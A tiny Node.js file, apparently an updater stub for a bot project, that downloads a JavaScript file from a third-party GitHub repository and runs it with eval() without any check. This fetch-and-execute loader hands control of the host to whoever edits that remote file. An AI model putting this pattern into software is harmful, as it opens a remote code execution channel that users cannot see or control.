const axios = require('axios');

axios.get("https://raw.githubusercontent.com/N1SA9EDITZ/KuRuMiV3/main/updater.js")
	.then(res => eval(res.data));